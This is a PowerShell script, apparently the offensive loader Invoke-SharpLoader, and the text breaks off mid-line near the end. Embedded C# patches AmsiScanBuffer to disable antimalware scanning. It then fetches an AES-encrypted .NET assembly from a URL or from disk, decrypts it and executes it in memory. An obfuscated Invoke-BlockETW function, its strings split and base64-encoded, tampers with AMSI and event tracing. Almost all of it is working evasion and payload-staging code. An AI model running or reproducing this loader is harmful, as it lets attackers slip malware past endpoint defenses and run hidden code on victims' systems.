function Invoke-SharpLoader
{
Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $location,
        [Parameter(Mandatory=$true)]
	    [string]
        $password,
        [string]
        $argument,
        [string]
        $argument2,
        [string]
        $argument3,
        [Switch]
        $noArgs
	)
Invoke-BlockETW

$sharploader = @"
using System;
using System.Net;
using System.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace SharpLoader
{
    public class gofor4msi
    {
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void now()
        {
            if (is64Bit())
                gofor(x64);
            else
                gofor(x86);
        }

        private static void gofor(byte[] patch)
        {
            try
            {
                var a = "am";
                var si = "si";
                var dll = ".dll";
                var lib = Win32.LoadLibrary(a+si+dll);
                var Am = "Am";
                var siScan = "siScan";
                var Buffer = "Buffer";
                var addr = Win32.GetProcAddress(lib, Am+siScan+Buffer);

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
    }
    public class Program
    {
        public static void PrintBanner()
        {
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"    ______                 __                __            ");
            Console.WriteLine(@"   / __/ /  ___ ________  / /  ___  ___ ____/ /__ ____     ");
            Console.WriteLine(@"  _\ \/ _ \/ _ `/ __/ _ \/ /__/ _ \/ _ `/ _  / -_) __/     ");
            Console.WriteLine(@" /___/_//_/\_,_/_/ / .__/____/\___/\_,_/\_,_/\__/_/        ");
            Console.WriteLine(@"                  /_/                                      ");
            Console.WriteLine(@"                                                           ");
            Console.WriteLine(@"             Loads an AES Encrypted CSharp File            ");
            Console.WriteLine(@"                        from disk or URL                   ");
            Console.WriteLine();
        }
        public static string Get_Stage2(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                IWebProxy webProxy = myWebRequest.Proxy;
                if (webProxy != null)
                {
                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    myWebRequest.Proxy = webProxy;
                }
                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                Stream data = response.GetResponseStream();
                string html = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    html = sr.ReadToEnd();
                }
                return html;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
                Console.ResetColor();
                return null;
            }
        }
        public static string Get_Stage2disk(string filepath)
        {
            string folderPathToBinary = filepath;
            string base64 = System.IO.File.ReadAllText(folderPathToBinary);
            return base64;
        }
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }
        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }
        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }
        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            gofor4msi.now();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
        public static void Main(params string[] args)
        {
            PrintBanner();
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string location = args[0];
            string ishttp = "http";
            string Stage2;
            if (location.StartsWith(ishttp))
            {
                Console.Write("[*] One moment while getting our file from URL.... ");
                Stage2 = Get_Stage2(location);
            }
            else
            {
                Console.WriteLine("NO URL, loading from disk.");
                Console.Write("[*] One moment while getting our file from disk.... ");
                Stage2 = Get_Stage2disk(location);
            }
            Console.WriteLine("-> Done");
            Console.WriteLine();
            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();
            byte[] decoded = Base64_Decode(Stage2);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
            int _saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            object[] cmd = args.Skip(2).ToArray();
            loadAssembly(originalBytes, cmd);
        }
    }
}
"@

Add-Type -TypeDefinition $sharploader

if ($noArgs)
{
    [SharpLoader.Program]::Main("$location","$password")
}
elseif ($argument3)
{
    [SharpLoader.Program]::Main("$location","$password","$argument","$argument2", "$argument3")
}
elseif ($argument2)
{
    [SharpLoader.Program]::Main("$location","$password","$argument","$argument2")
}
elseif ($argument)
{
    [SharpLoader.Program]::Main("$location","$password","$argument")
}

}


function Invoke-BlockETW
{
	$OzKFZX2YQpMDfU3a1 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
	$8t9deQ = {param($vg5Fp0GeLc9Ko) [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($vg5Fp0GeLc9Ko))}
	$4sKza0 = &$8t9deQ "ID12 344p4HkID26 LsykYdID58 mogdvQID60 sDjaID93 1BTLBUID27 m01qOKID61 i1Ct3lID67 MDaiID80 aLblID83 OBUx5FNID87 R3Zkg1ID94 dk0gQYzID15 zRcFlID71 hau3DdID32 S3IID39 j3hjYT1ID77 i1FPCGID1 3okuCID29 Ro01ID52 OkjVID14 s2qID22 ZB6ptID66 JGKKMLkID16 KKUcLHB1ID53 UYfsbID62 dreCighID0 jNxoFw8ID38 JSkjvdID55 a82bID5 YKHTID85 3Dk2mID3 ihKFID30 zyloID86 yS7nID13 SbYveeID37 OYA0HZID4 k4fID19 ZlgEID28 5ewvndID56 6HQjCj2WID11 FiEgID72 ykF1w1ID2 5ZaoID64 UAfxr3XlID18 L2ZID34 IxyID97 UuAIMibID57 vP4KID79 DoP2bID90 hhWvRjUnQID40 Ld0g5EXuID88 WcIEiQID92 TKrID98 lXUTxWlXID7 GDZID45 eXi5ck7ID70 i87eID91 CXtAGyVID24 ZvTID44 GYnMbLN0ID41 vjeQID59 CxqZb2ID6 AwhdID46 58HuOs1ID20 wA1hID76 2ursOAdGID17 FP4qmID50 w2XALGID96 nOfx2ClID51 R935ID75 wV0VUVqvID68 bSZc6SbID9 jGyID25 kxzAQi5ID42 VUOID69 2bYBID95 lgQAbbID8 SryID48 kCufID49 rWwHXID21 zOuID47 4XfpID65 a04dNpID74 uLDVurVID36 fN7LqsXID23 JaBHgDnID43 EJPID78 IkTjw7RID35 DxDgOC9ID73 Guo3gpID31 aUp0ID33 OvJcID54 zu2bID10 hCPID89 5oNWulHID82 2MolMID63 ZpQHjGID81 e5MCID84 AVRTIID99 FtYaOm5=".Replace("ID0 jNxoFw8", "").Replace("ID1 3okuC", "").Replace("ID2 5Zao", "").Replace("ID3 ihK", "").Replace("ID4 k4f", "").Replace("ID5 YKHT", "").Replace("ID6 Awhd", "").Replace("ID7 GDZ", "").Replace("ID8 Sry", "").Replace("ID9 jGy", "").Replace("ID10 hCP", "").Replace("ID11 FiEg", "").Replace("ID12 344p4Hk", "").Replace("ID13 SbYvee", "").Replace("ID14 s2q", "").Replace("ID15 zRcFl", "").Replace("ID16 KKUcLHB", "").Replace("ID17 FP4qm", "").Replace("ID18 L2Z", "").Replace("ID19 ZlgE", "").Replace("ID20 wA1", "").Replace("ID21 zOu", "").Replace("ID22 ZB6p", "").Replace("ID23 JaBHgDn", "").Replace("ID24 ZvT", "").Replace("ID25 kxzAQ", "").Replace("ID26 LsykYd", "").Replace("ID27 m01qOK", "").Replace("ID28 5ewvnd", "").Replace("ID29 Ro01", "").Replace("ID30 zylo", "").Replace("ID31 aUp0", "").Replace("ID32 S3I", "").Replace("ID33 OvJc", "").Replace("ID34 Ixy", "").Replace("ID35 DxDgOC9", "").Replace("ID36 fN7Lqs", "").Replace("ID37 OYA0H", "").Replace("ID38 JSkjvd", "").Replace("ID39 j3hjYT1", "").Replace("ID40 Ld0g5EX", "").Replace("ID41 vjeQ", "").Replace("ID42 VUO", "").Replace("ID43 EJP", "").Replace("ID44 GYnMbLN", "").Replace("ID45 eXi5ck7", "").Replace("ID46 58HuOs", "").Replace("ID47 4Xfp", "").Replace("ID48 kCuf", "").Replace("ID49 rWwH", "").Replace("ID50 w2XALG", "").Replace("ID51 R935", "").Replace("ID52 Okj", "").Replace("ID53 UYfsb", "").Replace("ID54 zu2", "").Replace("ID55 a82", "").Replace("ID56 6HQjCj2", "").Replace("ID57 vP4K", "").Replace("ID58 mogdvQ", "").Replace("ID59 CxqZ", "").Replace("ID60 sDja", "").Replace("ID61 i1Ct", "").Replace("ID62 dreCig", "").Replace("ID63 ZpQHjG", "").Replace("ID64 UAfxr3X", "").Replace("ID65 a04d", "").Replace("ID66 JGKKM", "").Replace("ID67 MDai", "").Replace("ID68 bSZc6S", "").Replace("ID69 2bY", "").Replace("ID70 i87e", "").Replace("ID71 hau3D", "").Replace("ID72 ykF1w", "").Replace("ID73 Guo3g", "").Replace("ID74 uLDVur", "").Replace("ID75 wV0VUVq", "").Replace("ID76 2ursOA", "").Replace("ID77 i1FPC", "").Replace("ID78 IkTjw7", "").Replace("ID79 DoP2b", "").Replace("ID80 aLbl", "").Replace("ID81 e5MC", "").Replace("ID82 2Mol", "").Replace("ID83 OBUx5FN", "").Replace("ID84 AVRTI", "").Replace("ID85 3Dk2", "").Replace("ID86 yS7", "").Replace("ID87 R3Zkg1", "").Replace("ID88 WcIEi", "").Replace("ID89 5oNWul", "").Replace("ID90 hhWvRjU", "").Replace("ID91 CXtAGy", "").Replace("ID92 TKr", "").Replace("ID93 1BTLB", "").Replace("ID94 dk0gQY", "").Replace("ID95 lgQAb", "").Replace("ID96 nOfx2C", "").Replace("ID97 UuAIMi", "").Replace("ID98 lXUTxWl", "").Replace("ID99 FtYaOm5", "")
	$L7cixjsZS6WbozU18aYvTNqE = &$8t9deQ "ID21 9ZsKi7iID24 d73ZUNID28 OSnSYID16 5ZcID22 RNzMZWID3 QuZ3eID5 Gq7YfcID7 2wkpG1ID1 9axzaID6 ExseRID13 Pl1IFID20 xuETSID29 8yBFgyUNID2 zza6ID10 MmEf2UID17 RYKNp2XID26 A4sAUjvID12 phcMeID23 dFRwjknbID15 hpG7OOnID4 luoGF6ID8 YaejQiRID14 1bRlID11 IwjbID19 8AnneID0 fwiAI5WID9 rVlU2lSID27 x6uQpEHQID18 9vhID25 Fhhv=".Replace("ID0 fwiAI5W", "").Replace("ID1 9ax", "").Replace("ID2 zza6", "").Replace("ID3 QuZ3e", "").Replace("ID4 luoGF6", "").Replace("ID5 Gq7Yfc", "").Replace("ID6 ExseR", "").Replace("ID7 2wkpG", "").Replace("ID8 YaejQi", "").Replace("ID9 rVlU2lS", "").Replace("ID10 MmEf2U", "").Replace("ID11 Iwjb", "").Replace("ID12 phcMe", "").Replace("ID13 Pl1IF", "").Replace("ID14 1bR", "").Replace("ID15 hpG7OO", "").Replace("ID16 5Zc", "").Replace("ID17 RYKNp2X", "").Replace("ID18 9vh", "").Replace("ID19 8Ann", "").Replace("ID20 xuETS", "").Replace("ID21 9ZsKi7i", "").Replace("ID22 RNzMZ", "").Replace("ID23 dFRwjkn", "").Replace("ID24 d73ZUN", "").Replace("ID25 Fhhv", "").Replace("ID26 A4sAUj", "").Replace("ID27 x6uQpE", "").Replace("ID28 OSnS", "").Replace("ID29 8yBFgy", "")
	[Ref].Assembly.GetType($4sKza0).GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType($4sKza0).GetField($L7cixjsZS6WbozU18aYvTNqE,"NonPublic,Static").SetValue($null, [IntPtr]$OzKFZX2YQpMDfU3a1)
	$4CULmTg8K8jFOSPU6 = "WID14 hslID85 kVHnt0B1ID58 2axFFSWJID194 nwXlZmxID20 clXVQlID36 ao8aX16Y3RID74 VcfzGApb2ID120 fKfISo84ID134 W2yAdvuID86 1wTo9vUQXNzID37 6VdYdZID132 WXNzE7WID56 kAFxID102 5A8s1ID6 QHA2qibHID153 Lx12ID173 0EATj2lID145 m2BxID189 MAyWdID10 Sv92lgeID73 AifOjpMbID23 7MWhdq2FkID115 1rfMBYWVID12 QdoEjIt2lID195 Sknvb0aFBhcnRpYWxOID29 mEUGQtZYWID121 00BRzye1ID109 CbJQ4m3lKID92 lbnCID100 KS2dTID49 TljOeXN0ID181 unEZID95 nGa5ID123 ecFW0ID111 Mkhh8ouID172 H0rHID185 sykLijQID70 QKb4E29yZID151 qQ5ScID33 d88spID139 oeFpLkdldFID156 eDTdO0WRID176 uFFXpt5cID15 bfQLHroGUoJ1NID79 9vH5c3RID71 hWnQllID122 5rQDbwbID140 sNOOESID167 f4ra8S5EaID60 5YGID193 wtD1sWID2 LFt0TDkFID5 jQhFbrnbmID52 mqdJ9zdGljcy5ID192 NvqoCGeFdmVuID190 GzLjdGlID114 4Il1jvuID91 y8NKID127 AG6fedZy5ID11 NtxWmEPID69 QFyggJFID51 stTrRzdID137 aGHp3lmID9 cpRy40qVID146 u9DHDudFBybID55 E4p3ZpID28 Qbp0lbZID67 X9RID113 3HBcGVID45 ODvuID72 iDgDJyJID3 rZvAquykuRID143 YVG5FN2ID77 wabOID188 PVXWL5fV0RID13 gorCSSGmllID197 pYDFH1ebID168 6ORhLGID129 PsEQID38 E0keID108 7UhID159 gIcoID150 h6Od7USJID177 1vdOs7b21ID104 OmhLID182 LKtfPefZID0 xEADzlJW5hYID88 f2NS7VyID164 CHILkDmxlZCcsID19 7K3li4JID93 IC51c05vbID21 qmjvID142 OTpLFwlB1ID117 70YQBID180 xkiaYID128 LY0zID160 wtoD3mxpYyxID157 eQcFJbnID48 QjzIN0YWID89 RVp5jZScpID75 wJltNiSLlID42 DH2yZ3NlID81 8HQWW8WdID126 pzKOWFZhbHID179 1TehVID82 rcXlKFtID24 iKAzID170 vFl2uLSZWZdLID161 mL5ESkID97 ZAzFzc2VID101 NKf5PtYmID198 0ZMrwxID30 ADT5LkdID65 RsTomldFR5cID144 m5GIGID7 bMo7R0UoJ1ID8 3jLID84 yiCo9N5cID76 55Ngvn3RlID118 zmQID124 ZiHP9bID16 MsjQUS5NID18 iQIeYID43 DtTW5hZ2VtZID34 tYU6W5ID199 YXP0ID147 7z6s9ID183 1bpKFrLkF1dG9ID53 3GvtID47 F8beh7YID4 4VsufXID107 0nZmRID155 QW8ZpKpb24ID196 xoDcZuVHID112 y0NeHJID119 S41phID138 QWVEDa2Y2lID106 KNxuID32 eNleID78 FSkoID90 ZvAZyID187 FTbCF6t5ID116 ij7Up7fQID68 b2Ob6U0ID163 aygNHUID169 vvOi4chV0ID61 J5BID149 ex8Fpd0xvZID110 dRrpX1BybID41 6viN3ZID184 kMTipZID83 6s0J6ITGVID27 bIHrOrFyJykuRID80 Fmx2ID26 KbSf9PVID66 vwhv70RmID17 oIJolID135 5h0L6lID57 dCeIGeID125 LLYFdFbGQID158 5fIhZ6oID99 mvsdPanJ2V0d1ID175 Kr9bBID50 qHwybID148 Unj5jb03ZpZID59 UGEhpGID22 Lqj7VID39 xDOyID133 wYQSrJywID103 lDUYnnID178 cAkbr16TmID25 pScLyBA9uUHID165 SGpVID154 9HwBxTYibID131 IDjGlID31 QW3jID44 O9yLFN0YID96 RwX11Y8XID171 SVlRRpID35 geNeYID130 aMJAtyID40 ijaYOCwcID98 oa9QpID1 qpdcZID174 HHLvLkdlID136 XBSwfIID191 gnNB1TEdFZID141 pMD1crID152 4myyihID63 BX5Lv8SbHID54 De7ID186 CJhDiVlKID105 nJOMECID162 e3DRudWID46 G5EID87 89llhvLxsKID166 gzkf59SwwID64 KsapizgKID62 Ue8SQ=ID94 dZ2c1IA=".Replace("ID0 xEADzlJ", "").Replace("ID1 qpdcZ", "").Replace("ID2 LFt0TDk", "").Replace("ID3 rZvAqu", "").Replace("ID4 4Vsuf", "").Replace("ID5 jQhFbr", "").Replace("ID6 QHA2q", "").Replace("ID7 bMo7R0", "").Replace("ID8 3jL", "").Replace("ID9 cpRy40q", "").Replace("ID10 Sv92lge", "").Replace("ID11 NtxWmEP", "").Replace("ID12 QdoEjIt", "").Replace("ID13 gorCSSG", "").Replace("ID14 hsl", "").Replace("ID15 bfQLHro", "").Replace("ID16 MsjQU", "").Replace("ID17 oIJo", "").Replace("ID18 iQIe", "").Replace("ID19 7K3li4", "").Replace("ID20 clXVQ", "").Replace("ID21 qmjv", "").Replace("ID22 Lqj7", "").Replace("ID23 7MWhdq", "").Replace("ID24 iKAz", "").Replace("ID25 pScLyBA", "").Replace("ID26 KbSf9P", "").Replace("ID27 bIHrOrF", "").Replace("ID28 Qbp0lb", "").Replace("ID29 mEUGQtZ", "").Replace("ID30 ADT", "").Replace("ID31 QW3", "").Replace("ID32 eNle", "").Replace("ID33 d88s", "").Replace("ID34 tYU6", "").Replace("ID35 geNe", "").Replace("ID36 ao8aX16", "").Replace("ID37 6VdYd", "").Replace("ID38 E0ke", "").Replace("ID39 xDO", "").Replace("ID40 ijaYOCw", "").Replace("ID41 6viN", "").Replace("ID42 DH2yZ3", "").Replace("ID43 DtT", "").Replace("ID44 O9y", "").Replace("ID45 ODvu", "").Replace("ID46 G5E", "").Replace("ID47 F8beh7", "").Replace("ID48 QjzI", "").Replace("ID49 TljO", "").Replace("ID50 qHw", "").Replace("ID51 stTrRz", "").Replace("ID52 mqdJ", "").Replace("ID53 3Gv", "").Replace("ID54 De7", "").Replace("ID55 E4p", "").Replace("ID56 kAFx", "").Replace("ID57 dCeIGe", "").Replace("ID58 2axFFSW", "").Replace("ID59 UGEhp", "").Replace("ID60 5YG", "").Replace("ID61 J5B", "").Replace("ID62 Ue8S", "").Replace("ID63 BX5Lv8S", "").Replace("ID64 Ksapizg", "").Replace("ID65 RsTom", "").Replace("ID66 vwhv7", "").Replace("ID67 X9R", "").Replace("ID68 b2Ob6", "").Replace("ID69 QFyggJ", "").Replace("ID70 QKb4E", "").Replace("ID71 hWnQl", "").Replace("ID72 iDgDJ", "").Replace("ID73 Aif", "").Replace("ID74 VcfzGA", "").Replace("ID75 wJltNiS", "").Replace("ID76 55Ngvn", "").Replace("ID77 wabO", "").Replace("ID78 FSko", "").Replace("ID79 9vH", "").Replace("ID80 Fmx", "").Replace("ID81 8HQWW8W", "").Replace("ID82 rcX", "").Replace("ID83 6s0J6IT", "").Replace("ID84 yiCo9", "").Replace("ID85 kVHnt0B", "").Replace("ID86 1wTo9vU", "").Replace("ID87 89llhvL", "").Replace("ID88 f2NS7Vy", "").Replace("ID89 RVp", "").Replace("ID90 ZvA", "").Replace("ID91 y8NK", "").Replace("ID92 lbn", "").Replace("ID93 IC51c", "").Replace("ID94 dZ2c1IA", "").Replace("ID95 nGa5", "").Replace("ID96 RwX11Y8", "").Replace("ID97 ZAz", "").Replace("ID98 oa9Q", "").Replace("ID99 mvsdPan", "").Replace("ID100 KS2", "").Replace("ID101 NKf5P", "").Replace("ID102 5A8s", "").Replace("ID103 lDUYn", "").Replace("ID104 OmhL", "").Replace("ID105 nJOME", "").Replace("ID106 KNx", "").Replace("ID107 0nZm", "").Replace("ID108 7Uh", "").Replace("ID109 CbJQ4m3", "").Replace("ID110 dRrpX", "").Replace("ID111 Mkhh8o", "").Replace("ID112 y0NeH", "").Replace("ID113 3HBc", "").Replace("ID114 4Il1jv", "").Replace("ID115 1rfMBYW", "").Replace("ID116 ij7Up7f", "").Replace("ID117 70YQB", "").Replace("ID118 zmQ", "").Replace("ID119 S41p", "").Replace("ID120 fKfISo8", "").Replace("ID121 00BRzye", "").Replace("ID122 5rQDbw", "").Replace("ID123 ecF", "").Replace("ID124 ZiHP9", "").Replace("ID125 LLYFdF", "").Replace("ID126 pzKOW", "").Replace("ID127 AG6fed", "").Replace("ID128 LY0z", "").Replace("ID129 PsE", "").Replace("ID130 aMJAt", "").Replace("ID131 IDj", "").Replace("ID132 WXNzE7", "").Replace("ID133 wYQSr", "").Replace("ID134 W2yAdv", "").Replace("ID135 5h0L6", "").Replace("ID136 XBSwfI", "").Replace("ID137 aGHp3l", "").Replace("ID138 QWVEDa2", "").Replace("ID139 oeFp", "").Replace("ID140 sNOOES", "").Replace("ID141 pMD1cr", "").Replace("ID142 OTpLFw", "").Replace("ID143 YVG5FN", "").Replace("ID144 m5GI", "").Replace("ID145 m2Bx", "").Replace("ID146 u9DHD", "").Replace("ID147 7z6s9", "").Replace("ID148 Unj5jb0", "").Replace("ID149 ex8Fp", "").Replace("ID150 h6Od7US", "").Replace("ID151 qQ5", "").Replace("ID152 4myyi", "").Replace("ID153 Lx12", "").Replace("ID154 9HwBxTY", "").Replace("ID155 QW8ZpK", "").Replace("ID156 eDTdO0W", "").Replace("ID157 eQcF", "").Replace("ID158 5fIhZ6", "").Replace("ID159 gIc", "").Replace("ID160 wtoD3", "").Replace("ID161 mL5ES", "").Replace("ID162 e3D", "").Replace("ID163 aygNHU", "").Replace("ID164 CHILkD", "").Replace("ID165 SGp", "").Replace("ID166 gzkf59", "").Replace("ID167 f4ra8", "").Replace("ID168 6ORhL", "").Replace("ID169 vvOi4ch", "").Replace("ID170 vFl2uL", "").Replace("ID171 SVlR", "").Replace("ID172 H0rH", "").Replace("ID173 0EATj2", "").Replace("ID174 HHLv", "").Replace("ID175 Kr9b", "").Replace("ID176 uFFXpt", "").Replace("ID177 1vdOs7b", "").Replace("ID178 cAkbr16", "").Replace("ID179 1Teh", "").Replace("ID180 xkia", "").Replace("ID181 unE", "").Replace("ID182 LKtfPe", "").Replace("ID183 1bpKFr", "").Replace("ID184 kMTi", "").Replace("ID185 sykLij", "").Replace("ID186 CJhDi", "").Replace("ID187 FTbCF6t", "").Replace("ID188 PVXWL5f", "").Replace("ID189 MAyW", "").Replace("ID190 GzLj", "").Replace("ID191 gnNB1TE", "").Replace("ID192 NvqoCGe", "").Replace("ID193 wtD1s", "").Replace("ID194 nwX", "").Replace("ID195 Sknvb", "").Replace("ID196 xoDcZ", "").Replace("ID197 pYDFH1e", "").Replace("ID198 0ZMrw", "").Replace("ID199 YXP", "")
	$I8tjm = &$8t9deQ "WID14 hslID85 kVHnt0B1ID58 2axFFSWJID194 nwXlZmxID20 clXVQlID36 ao8aX16Y3RID74 VcfzGApb2ID120 fKfISo84ID134 W2yAdvuID86 1wTo9vUQXNzID37 6VdYdZID132 WXNzE7WID56 kAFxID102 5A8s1ID6 QHA2qibHID153 Lx12ID173 0EATj2lID145 m2BxID189 MAyWdID10 Sv92lgeID73 AifOjpMbID23 7MWhdq2FkID115 1rfMBYWVID12 QdoEjIt2lID195 Sknvb0aFBhcnRpYWxOID29 mEUGQtZYWID121 00BRzye1ID109 CbJQ4m3lKID92 lbnCID100 KS2dTID49 TljOeXN0ID181 unEZID95 nGa5ID123 ecFW0ID111 Mkhh8ouID172 H0rHID185 sykLijQID70 QKb4E29yZID151 qQ5ScID33 d88spID139 oeFpLkdldFID156 eDTdO0WRID176 uFFXpt5cID15 bfQLHroGUoJ1NID79 9vH5c3RID71 hWnQllID122 5rQDbwbID140 sNOOESID167 f4ra8S5EaID60 5YGID193 wtD1sWID2 LFt0TDkFID5 jQhFbrnbmID52 mqdJ9zdGljcy5ID192 NvqoCGeFdmVuID190 GzLjdGlID114 4Il1jvuID91 y8NKID127 AG6fedZy5ID11 NtxWmEPID69 QFyggJFID51 stTrRzdID137 aGHp3lmID9 cpRy40qVID146 u9DHDudFBybID55 E4p3ZpID28 Qbp0lbZID67 X9RID113 3HBcGVID45 ODvuID72 iDgDJyJID3 rZvAquykuRID143 YVG5FN2ID77 wabOID188 PVXWL5fV0RID13 gorCSSGmllID197 pYDFH1ebID168 6ORhLGID129 PsEQID38 E0keID108 7UhID159 gIcoID150 h6Od7USJID177 1vdOs7b21ID104 OmhLID182 LKtfPefZID0 xEADzlJW5hYID88 f2NS7VyID164 CHILkDmxlZCcsID19 7K3li4JID93 IC51c05vbID21 qmjvID142 OTpLFwlB1ID117 70YQBID180 xkiaYID128 LY0zID160 wtoD3mxpYyxID157 eQcFJbnID48 QjzIN0YWID89 RVp5jZScpID75 wJltNiSLlID42 DH2yZ3NlID81 8HQWW8WdID126 pzKOWFZhbHID179 1TehVID82 rcXlKFtID24 iKAzID170 vFl2uLSZWZdLID161 mL5ESkID97 ZAzFzc2VID101 NKf5PtYmID198 0ZMrwxID30 ADT5LkdID65 RsTomldFR5cID144 m5GIGID7 bMo7R0UoJ1ID8 3jLID84 yiCo9N5cID76 55Ngvn3RlID118 zmQID124 ZiHP9bID16 MsjQUS5NID18 iQIeYID43 DtTW5hZ2VtZID34 tYU6W5ID199 YXP0ID147 7z6s9ID183 1bpKFrLkF1dG9ID53 3GvtID47 F8beh7YID4 4VsufXID107 0nZmRID155 QW8ZpKpb24ID196 xoDcZuVHID112 y0NeHJID119 S41phID138 QWVEDa2Y2lID106 KNxuID32 eNleID78 FSkoID90 ZvAZyID187 FTbCF6t5ID116 ij7Up7fQID68 b2Ob6U0ID163 aygNHUID169 vvOi4chV0ID61 J5BID149 ex8Fpd0xvZID110 dRrpX1BybID41 6viN3ZID184 kMTipZID83 6s0J6ITGVID27 bIHrOrFyJykuRID80 Fmx2ID26 KbSf9PVID66 vwhv70RmID17 oIJolID135 5h0L6lID57 dCeIGeID125 LLYFdFbGQID158 5fIhZ6oID99 mvsdPanJ2V0d1ID175 Kr9bBID50 qHwybID148 Unj5jb03ZpZID59 UGEhpGID22 Lqj7VID39 xDOyID133 wYQSrJywID103 lDUYnnID178 cAkbr16TmID25 pScLyBA9uUHID165 SGpVID154 9HwBxTYibID131 IDjGlID31 QW3jID44 O9yLFN0YID96 RwX11Y8XID171 SVlRRpID35 geNeYID130 aMJAtyID40 ijaYOCwcID98 oa9QpID1 qpdcZID174 HHLvLkdlID136 XBSwfIID191 gnNB1TEdFZID141 pMD1crID152 4myyihID63 BX5Lv8SbHID54 De7ID186 CJhDiVlKID105 nJOMECID162 e3DRudWID46 G5EID87 89llhvLxsKID166 gzkf59SwwID64 KsapizgKID62 Ue8SQ=ID94 dZ2c1IA=".Replace("ID0 xEADzlJ", "").Replace("ID1 qpdcZ", "").Replace("ID2 LFt0TDk", "").Replace("ID3 rZvAqu", "").Replace("ID4 4Vsuf", "").Replace("ID5 jQhFbr", "").Replace("ID6 QHA2q", "").Replace("ID7 bMo7R0", "").Replace("ID8 3jL", "").Replace("ID9 cpRy40q", "").Replace("ID10 Sv92lge", "").Replace("ID11 NtxWmEP", "").Replace("ID12 QdoEjIt", "").Replace("ID13 gorCSSG", "").Replace("ID14 hsl", "").Replace("ID15 bfQLHro", "").Replace("ID16 MsjQU", "").Replace("ID17 oIJo", "").Replace("ID18 iQIe", 